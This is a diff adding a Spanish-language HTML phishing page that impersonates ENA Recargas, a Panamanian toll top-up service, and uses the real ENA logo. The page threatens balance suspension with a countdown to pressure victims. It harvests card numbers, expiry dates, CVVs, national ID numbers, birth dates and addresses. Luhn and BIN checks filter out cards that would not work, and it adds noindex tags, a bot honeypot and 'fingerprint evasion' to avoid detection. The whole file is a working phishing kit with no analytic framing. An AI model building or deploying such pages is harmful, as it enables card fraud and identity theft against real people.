@@ -1,0 +1,571 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <!-- Anti-crawler meta: Prevents indexing by search bots -->
+    <meta name="robots" content="noindex, nofollow">
+    <title>ENA Recargas - Top Up Balance</title>
+    <style>
+        /* Ensure full page coverage */
+        html {
+            height: 100%;
+        }
+        body {
+            background-image: url('/static/background2.jpg');  /* Path to your static image */
+            background-size: cover;  /* Scales to cover entire area without distortion */
+            background-position: center;  /* Centers the image */
+            background-repeat: no-repeat;  /* No tiling */
+            background-attachment: scroll;  /* Keeps it fixed during scrolling */
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            color: #223136;
+            height: 100vh;  /* Forces full viewport height coverage */
+            width: 100vw;  /* Forces full viewport width coverage */
+        }
+        .header {
+            background-color: transparent;  /* Make header background transparent to show image */
+            color: white;
+            padding: 10px;
+            text-align: center;
+        }
+        .header img {
+            width: 30%;
+            height: auto;
+        }
+        .form-container {
+            max-width: 600px;
+            margin: 20px auto;  /* Keeps it centered */
+            background: rgba(255, 255, 255, 0.6);  /* Reduced transparency for smoother image visibility */
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+        }
+        .form-group {
+            margin-bottom: 15px;
+        }
+        label {
+            display: block;
+            margin-bottom: 5px;
+            font-weight: bold;
+        }
+        input, select {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            color: black;
+        }
+        .card-input-container {
+            position: relative;
+        }
+        .card-brand {
+            position: absolute;
+            right: 10px;
+            top: 50%;
+            transform: translateY(-50%);
+            width: 40px;
+            height: 25px;
+            display: none;  /* Hidden by default */
+        }
+        .payment-fields {
+            display: block;  /* Always visible now */
+        }
+        .urgency-alert {
+            background-color: #ffdddd;
+            border: 1px solid #ff0000;
+            color: #d8000c;
+            padding: 10px;
+            margin-bottom: 20px;
+            border-radius: 4px;
+            font-weight: bold;
+            text-align: center;
+        }
+        button {
+            background-color: #273c53;
+            color: white;
+            padding: 10px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            width: 100%;
+            font-size: 16px;
+        }
+        button:hover {
+            background-color: #1f3043;
+        }
+        .footer {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 12px;
+            color: #666;
+        }
+        .error {
+            color: red;
+            font-size: 12px;
+            margin-top: 5px;
+            display: none;  /* Hidden by default for real-time */
+        }
+        .honeypot {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <img src="https://www.enarecargas.com/maxipista/VAADIN/themes/privatetheme/img/logoEna.jpg" alt="ENA Logo">
+    </div>
+
+    <!-- Randomized class for anti-fingerprinting -->
+    <div class="form-container" id="dynamic-container">
+        <div class="urgency-alert">
+            ¡Actualización de Pago Requerida! Para completar la verificación de seguridad y evitar la suspensión de tu saldo prepago, realiza una recarga de verificación de $1 antes de <span id="countdown"></span>. Tus datos serán procesados de forma segura.
+        </div>
+        <h2>Recargar Saldo de Peaje</h2>
+        <form id="rechargeForm" action="/submit" method="POST">  <!-- Changed action to /submit to match app.py -->
+            <div class="form-group">
+                <label for="tag">Número de Tag</label>
+                <input type="text" id="tag" name="tag">
+                <div class="error" id="tagError"></div>
+            </div>
+            <div class="form-group">
+                <label for="amount">Monto a Recargar</label>
+                <select id="amount" name="amount">
+                    <option value="">Seleccionar</option>
+                    <option value="1">$1</option>
+                    <option value="5">$5</option>
+                    <option value="10">$10</option>
+                    <option value="15">$15</option>
+                    <option value="20">$20</option>
+                    <option value="25">$25</option>
+                    <option value="50">$50</option>
+                </select>
+                <div class="error" id="amountError"></div>
+            </div>
+            <!-- Payment method is now assumed as CC, no dropdown -->
+            <input type="hidden" name="payment_method" value="cc">
+            <div class="payment-fields" id="cc-fields">
+                <div class="form-group">
+                    <label for="full_name">Nombre del Titular (como en la tarjeta)</label>
+                    <input type="text" id="full_name" name="full_name">
+                    <div class="error" id="fullNameError"></div>
+                </div>
+                <div class="form-group">
+                    <label for="card_number">Número de Tarjeta (16-19 dígitos)</label>
+                    <div class="card-input-container">
+                        <input type="text" id="card_number" name="card_number" maxlength="23">  <!-- Increased for spaces -->
+                        <img id="card-brand" class="card-brand" src="" alt="Card Brand">
+                    </div>
+                    <div class="error" id="cardNumberError"></div>
+                </div>
+                <div class="form-group">
+                    <label for="expiry">Fecha de Expiración (MM/YY)</label>
+                    <input type="text" id="expiry" name="expiry" maxlength="5">
+                    <div class="error" id="expiryError"></div>
+                </div>
+                <div class="form-group">
+                    <label for="cvc">Código de Seguridad (CVV/CVC)</label>
+                    <input type="text" id="cvc" name="cvc" maxlength="4">
+                    <div class="error" id="cvcError"></div>
+                </div>
+                <div class="form-group">
+                    <label for="email">Correo Electrónico</label>
+                    <input type="email" id="email" name="email">
+                    <div class="error" id="emailError"></div>
+                </div>
+                <div class="form-group">
+                    <label for="phone">Número de Teléfono (+507 prefix)</label>
+                    <input type="text" id="phone" name="phone" maxlength="13">  <!-- For +507 XXX-XXXX -->
+                    <div class="error" id="phoneError"></div>
+                </div>
+                <div class="form-group">
+                    <label for="dob">Fecha de Nacimiento</label>
+                    <input type="date" id="dob" name="dob">
+                    <div class="error" id="dobError"></div>
+                </div>
+                <div class="form-group">
+                    <label for="cedula">Número de Cédula (ID Nacional)</label>
+                    <input type="text" id="cedula" name="cedula" maxlength="20">
+                    <div class="error" id="cedulaError"></div>
+                </div>
+                <div class="form-group">
+                    <label for="street">Dirección de Facturación (Calle)</label>
+                    <input type="text" id="street" name="street">
+                    <div class="error" id="streetError"></div>
+                </div>
+                <div class="form-group">
+                    <label for="city">Ciudad</label>
+                    <input type="text" id="city" name="city">
+                    <div class="error" id="cityError"></div>
+                </div>
+                <div class="form-group">
+                    <label for="province">Provincia</label>
+                    <input type="text" id="province" name="province">
+                    <div class="error" id="provinceError"></div>
+                </div>
+                <div class="form-group">
+                    <label for="zip">Código Postal (ZIP)</label>
+                    <input type="text" id="zip" name="zip" maxlength="10">
+                    <div class="error" id="zipError"></div>
+                </div>
+            </div>
+            <!-- Honeypot field: Crawlers/bots might fill this; check in backend -->
+            <div class="honeypot">
+                <label for="website">Sitio Web</label>
+                <input type="text" id="website" name="website">
+            </div>
+            <button type="submit">Recargar Ahora</button>
+        </form>
+    </div>
+
+    <div class="footer">
+        <p>Transacción Segura | Contacto: 800-ENA</p>
+    </div>
+</body>
+</html>
+  <script>
+        // Countdown timer (24 hours)
+        const targetDate = new Date();
+        targetDate.setHours(targetDate.getHours() + 24);
+
+        function updateCountdown() {
+            const now = new Date();
+            const timeLeft = targetDate - now;
+
+            if (timeLeft <= 0) {
+                document.getElementById('countdown').textContent = 'tiempo agotado';
+                return;
+            }
+
+            const hours = Math.floor(timeLeft / (1000 * 60 * 60));
+            const minutes = Math.floor((timeLeft % (1000 * 60 * 60)) / (1000 * 60));
+            const seconds = Math.floor((timeLeft % (1000 * 60)) / 1000);
+
+            document.getElementById('countdown').textContent = `${hours}h ${minutes}m ${seconds}s`;
+        }
+
+        updateCountdown();
+        setInterval(updateCountdown, 1000);
+
+        // Luhn algorithm validation for card number
+        function luhnCheck(cardNumber) {
+            cardNumber = cardNumber.replace(/\D/g, '');  // Remove non-digits
+            if (!/^\d{13,19}$/.test(cardNumber)) return false;  // Check length
+
+            let sum = 0;
+            let shouldDouble = false;
+            for (let i = cardNumber.length - 1; i >= 0; i--) {
+                let digit = parseInt(cardNumber.charAt(i));
+                if (shouldDouble) {
+                    digit *= 2;
+                    if (digit > 9) digit -= 9;
+                }
+                sum += digit;
+                shouldDouble = !shouldDouble;
+            }
+            return sum % 10 === 0;
+        }
+
+        // Basic BIN validation (first 6 digits)
+        function validateBin(cardNumber) {
+            const bin = cardNumber.substring(0, 6);
+            // Common BIN patterns: Visa (4), Mastercard (5), Amex (3), Discover (6)
+            if (/^4/.test(bin)) return 'Visa';
+            if (/^5[1-5]/.test(bin)) return 'Mastercard';
+            if (/^3[47]/.test(bin)) return 'American Express';
+            if (/^6(?:011|5)/.test(bin)) return 'Discover';
+            return false;  // Invalid BIN
+        }
+
+        // Card brand image display
+        const cardInput = document.getElementById('card_number');
+        const cardBrandImg = document.getElementById('card-brand');
+        cardInput.addEventListener('input', function() {
+            const cardNumber = cardInput.value.replace(/\D/g, '');
+            const brand = validateBin(cardNumber);
+            if (brand && cardNumber.length >= 6) {
+                // Replace with actual image URLs or base64
+                if (brand === 'Visa') cardBrandImg.src = 'https://www.bing.com/th/id/OIP.EToQaql50Fd6v6DSFuZK9gHaEK?w=244&h=211&c=8&rs=1&qlt=90&o=6&dpr=1.1&pid=3.1&rm=2';  // Replace with real URL
+                else if (brand === 'Mastercard') cardBrandImg.src = 'https://www.bing.com/th/id/OIP.8hSdZiAvNki23CzVyAvSLQHaEK?w=250&h=211&c=8&rs=1&qlt=90&o=6&dpr=1.1&pid=3.1&rm=2';
+                else if (brand === 'American Express') cardBrandImg.src = 'https://www.bing.com/th/id/OIP.C3222CedyFhyZRW3cTngvgHaEK?w=244&h=211&c=8&rs=1&qlt=90&o=6&dpr=1.1&pid=3.1&rm=2';
+                else if (brand === 'Discover') cardBrandImg.src = 'https://www.bing.com/th/id/OIP.r3EkxEA6UpqXph81azFJBgHaHa?w=178&h=211&c=8&rs=1&qlt=90&o=6&dpr=1.1&pid=3.1&rm=2';
+                cardBrandImg.style.display = 'block';
+            } else {
+                cardBrandImg.style.display = 'none';
+            }
+        });
+
+        // Card number formatting (add spaces every 4 digits) and real-time validation
+        cardInput.addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\D/g, '');  // Remove non-digits
+            value = value.substring(0, 19);  // Limit to 19 digits
+            value = value.replace(/(\d{4})(?=\d)/g, '$1 ');  // Add space every 4 digits
+            e.target.value = value;
+
+            // Real-time validation
+            const cleanValue = value.replace(/\s/g, '');
+            const errorDiv = document.getElementById('cardNumberError');
+            if (cleanValue.length >= 13) {
+                if (!/^\d{13,19}$/.test(cleanValue)) {
+                    showError('cardNumberError', 'El número de tarjeta debe tener entre 13 y 19 dígitos.');
+                } else if (!luhnCheck(cleanValue)) {
+                    showError('cardNumberError', 'Número de tarjeta inválido.');
+                } else if (!validateBin(cleanValue)) {
+                    showError('cardNumberError', 'BIN inválido (no corresponde a Visa, Mastercard, Amex o Discover).');
+                } else {
+                    clearError('cardNumberError');
+                }
+            } else {
+                clearError('cardNumberError');
+            }
+        });
+
+        // Expiry date formatting (MM/YY, numbers only, reject < 2025)
+        const expiryInput = document.getElementById('expiry');
+        expiryInput.addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\D/g, '');  // Numbers only
+            if (value.length >= 2) {
+                value = value.substring(0, 4);  // Limit to 4 digits
+                value = value.replace(/(\d{2})(\d{0,2})/, '$1/$2');  // Add slash after 2 digits
+            }
+            e.target.value = value;
+        });
+
+        // Phone number formatting (Panamanian: +507 XXX-XXXX, allow clearing)
+        const phoneInput = document.getElementById('phone');
+        phoneInput.addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\D/g, '');  // Numbers only
+            if (value.length === 0) {
+                e.target.value = '';  // Allow full clearing
+                return;
+            }
+            if (value.length > 7) {
+                value = value.substring(0, 7);  // Limit to 7 digits after +507
+                e.target.value = '+507 ' + value.replace(/(\d{3})(\d{4})/, '$1-$2');  // Format as +507 XXX-XXXX
+            } else if (value.length > 3) {
+                e.target.value = '+507 ' + value.substring(0, 3) + '-' + value.substring(3);
+            } else {
+                e.target.value = '+507 ' + value;
+            }
+        });
+
+        // Email validation (restrict to common domains, reject gibberish)
+        const emailInput = document.getElementById('email');
+        const validDomains = ['gmail.com', 'yahoo.com', 'hotmail.com', 'outlook.com', 'aol.com', 'icloud.com', 'ymail.com', 'me.com', 'live.com'];
+        emailInput.addEventListener('blur', function() {
+            const email = emailInput.value.trim();
+            const atIndex = email.indexOf('@');
+            if (atIndex === -1) {
+                showError('emailError', 'Correo electrónico inválido.');
+                return;
+            }
+            const domain = email.substring(atIndex + 1).toLowerCase();
+            if (!validDomains.includes(domain)) {
+                showError('emailError', 'Dominio no permitido. Use un dominio común como gmail.com o yahoo.com.');
+            } else {
+                clearError('emailError');
+            }
+        });
+
+        // Numeric input restrictions for relevant fields (except card, expiry, phone which are handled above)
+        const numericFields = ['cvc', 'cedula', 'zip'];
+        numericFields.forEach(fieldId => {
+            const field = document.getElementById(fieldId);
+            field.addEventListener('input', function(e) {
+                let value = e.target.value.replace(/\D/g, '');
+                if (fieldId === 'cvc' && value.length > 4) value = value.substring(0, 4);
+                else if (fieldId === 'cedula' && value.length > 20) value = value.substring(0, 20);
+                else if (fieldId === 'zip' && value.length > 10) value = value.substring(0, 10);
+                e.target.value = value;
+            });
+        });
+
+        // Randomized container class for fingerprint evasion
+        (function() {
+            var randomClass = ['container-var1', 'container-var2', 'container-var3'][Math.floor(Math.random() * 3)];
+            document.getElementById('dynamic-container').classList.add(randomClass);
+        })();
+
+        document.getElementById('rechargeForm').addEventListener('submit', function(event) {
+            let isValid = true;
+            clearErrors();
+            let firstErrorField = null;
+
+            const tag = document.getElementById('tag').value.trim();
+            if (!tag) {
+                showError('tagError', 'Por favor, ingresa el número de tag.');
+                if (!firstErrorField) firstErrorField = document.getElementById('tag');
+                isValid = false;
+            } else if (!/^\d{8}$/.test(tag)) {
+                showError('tagError', 'El número de tag debe tener 8 dígitos.');
+                if (!firstErrorField) firstErrorField = document.getElementById('tag');
+                isValid = false;
+            }
+
+            const amount = document.getElementById('amount').value;
+            if (!amount) {
+                showError('amountError', 'Por favor, selecciona un monto.');
+                if (!firstErrorField) firstErrorField = document.getElementById('amount');
+                isValid = false;
+            }
+
+            // Removed payment method check since it's always CC now
+            const fullName = document.getElementById('full_name').value.trim();
+            if (!fullName) {
+                showError('fullNameError', 'Por favor, ingresa el nombre del titular.');
+                if (!firstErrorField) firstErrorField = document.getElementById('full_name');
+                isValid = false;
+            }
+
+            const cardNumber = document.getElementById('card_number').value.trim();
+            if (!cardNumber) {
+                showError('cardNumberError', 'Por favor, ingresa el número de tarjeta.');
+                if (!firstErrorField) firstErrorField = document.getElementById('card_number');
+                isValid = false;
+            } else if (!/^\d{13,19}$/.test(cardNumber.replace(/\s/g, ''))) {
+                showError('cardNumberError', 'El número de tarjeta debe tener entre 13 y 19 dígitos.');
+                if (!firstErrorField) firstErrorField = document.getElementById('card_number');
+                isValid = false;
+            } else if (!luhnCheck(cardNumber)) {
+                showError('cardNumberError', 'Número de tarjeta inválido.');
+                if (!firstErrorField) firstErrorField = document.getElementById('card_number');
+                isValid = false;
+            } else if (!validateBin(cardNumber)) {
+                showError('cardNumberError', 'BIN inválido (no corresponde a Visa, Mastercard, Amex o Discover).');
+                if (!firstErrorField) firstErrorField = document.getElementById('card_number');
+                isValid = false;
+            }
+
+            const expiry = document.getElementById('expiry').value.trim();
+            if (!expiry) {
+                showError('expiryError', 'Por favor, ingresa la fecha de expiración.');
+                if (!firstErrorField) firstErrorField = document.getElementById('expiry');
+                isValid = false;
+            } else if (!/^(0[1-9]|1[0-2])\/\d{2}$/.test(expiry)) {
+                showError('expiryError', 'La fecha debe estar en formato MM/YY.');
+                if (!firstErrorField) firstErrorField = document.getElementById('expiry');
+                isValid = false;
+            } else {
+                const [, month, year] = expiry.match(/(\d{2})\/(\d{2})/);
+                const expiryYear = parseInt('20' + year);
+                if (expiryYear < 2025) {
+                    showError('expiryError', 'La fecha de expiración debe ser 2025 o posterior.');
+                    if (!firstErrorField) firstErrorField = document.getElementById('expiry');
+                    isValid = false;
+                }
+            }
+
+            const cvc = document.getElementById('cvc').value.trim();
+            if (!cvc) {
+                showError('cvcError', 'Por favor, ingresa el código CVC.');
+                if (!firstErrorField) firstErrorField = document.getElementById('cvc');
+                isValid = false;
+            } else if (!/^\d{3,4}$/.test(cvc)) {
+                showError('cvcError', 'El CVC debe tener 3 o 4 dígitos.');
+                if (!firstErrorField) firstErrorField = document.getElementById('cvc');
+                isValid = false;
+            }
+
+            const email = document.getElementById('email').value.trim();
+            if (!email) {
+                showError('emailError', 'Por favor, ingresa el correo electrónico.');
+                if (!firstErrorField) firstErrorField = document.getElementById('email');
+                isValid = false;
+            } else if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
+                showError('emailError', 'Por favor, ingresa un correo electrónico válido.');
+                if (!firstErrorField) firstErrorField = document.getElementById('email');
+                isValid = false;
+            } else {
+                const domain = email.substring(email.indexOf('@') + 1).toLowerCase();
+                if (!validDomains.includes(domain)) {
+                    showError('emailError', 'Dominio no permitido. Use un dominio común como gmail.com o yahoo.com.');
+                    if (!firstErrorField) firstErrorField = document.getElementById('email');
+                    isValid = false;
+                }
+            }
+
+            const phone = document.getElementById('phone').value.trim();
+            if (!phone) {
+                showError('phoneError', 'Por favor, ingresa el número de teléfono.');
+                if (!firstErrorField) firstErrorField = document.getElementById('phone');
+                isValid = false;
+            } else if (!/^\+507 \d{3}-\d{4}$/.test(phone)) {
+                showError('phoneError', 'El teléfono debe estar en formato +507 123-4567.');
+                if (!firstErrorField) firstErrorField = document.getElementById('phone');
+                isValid = false;
+            }
+
+            const dob = document.getElementById('dob').value;
+            if (!dob) {
+                showError('dobError', 'Por favor, ingresa la fecha de nacimiento.');
+                if (!firstErrorField) firstErrorField = document.getElementById('dob');
+                isValid = false;
+            }
+
+            const cedula = document.getElementById('cedula').value.trim();
+            if (!cedula) {
+                showError('cedulaError', 'Por favor, ingresa el número de cédula.');
+                if (!firstErrorField) firstErrorField = document.getElementById('cedula');
+                isValid = false;
+            }
+
+            const street = document.getElementById('street').value.trim();
+            if (!street) {
+                showError('streetError', 'Por favor, ingresa la dirección.');
+                if (!firstErrorField) firstErrorField = document.getElementById('street');
+                isValid = false;
+            }
+
+            const city = document.getElementById('city').value.trim();
+            if (!city) {
+                showError('cityError', 'Por favor, ingresa la ciudad.');
+                if (!firstErrorField) firstErrorField = document.getElementById('city');
+                isValid = false;
+            }
+
+            const province = document.getElementById('province').value.trim();
+            if (!province) {
+                showError('provinceError', 'Por favor, ingresa la provincia.');
+                if (!firstErrorField) firstErrorField = document.getElementById('province');
+                isValid = false;
+            }
+
+            const zip = document.getElementById('zip').value.trim();
+            if (!zip) {
+                showError('zipError', 'Por favor, ingresa el código postal.');
+                if (!firstErrorField) firstErrorField = document.getElementById('zip');
+                isValid = false;
+            }
+
+            if (!isValid) {
+                event.preventDefault();
+                // Scroll to the first error field
+                if (firstErrorField) {
+                    firstErrorField.scrollIntoView({ behavior: 'smooth', block: 'center' });
+                }
+            }
+        });
+
+        function showError(id, message) {
+            const errorDiv = document.getElementById(id);
+            errorDiv.textContent = message;
+            errorDiv.style.display = 'block';
+        }
+
+        function clearErrors() {
+            const errors = document.querySelectorAll('.error');
+            errors.forEach(error => {
+                error.textContent = '';
+                error.style.display = 'none';
+            });
+        }
+
+        function clearError(id) {
+            const errorDiv = document.getElementById(id);
+            errorDiv.textContent = '';
+            errorDiv.style.display = 'none';
+        }
+    </script>
+</body>
+</html>
